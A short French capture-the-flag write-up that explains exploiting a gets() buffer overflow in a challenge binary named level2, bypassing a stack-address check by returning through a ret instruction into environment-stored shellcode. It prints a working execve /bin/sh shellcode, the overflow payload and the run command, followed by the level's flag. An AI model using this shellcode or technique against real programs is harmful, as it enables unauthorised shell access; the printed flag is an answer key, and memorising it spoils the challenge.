## GET Flag

Ce binaire utilisant aussi gets, mais utilise une protection en vérifiant après l'appel que l'eip ne soit pas une adresse de la stack (commençant par 0xb).

Il n'est donc pas possible de remplacer l'eip par l'adresse d'un SHELLCODE placé dans l'environnement.

Cependant l'adresse du ret de cette fonction n'est pas une adresse de la stack et cette instruction à pour particularité de décaler la stack de 4octets. 

Il est donc possible d'écrire l'adresse du shellcode préalablement exporté dans l'environnement juste après l'adresse de ce return.

```
export SHELLCODE=$(python -c 'print 50 * "\x90" + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
python -c 'print 80 * "A" + "\x3e\x85\x04\x08" + "\xe0\xf8\xff\xbf"' > exploit
cat exploit - | ./level2
```

### Flag

```
level3
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
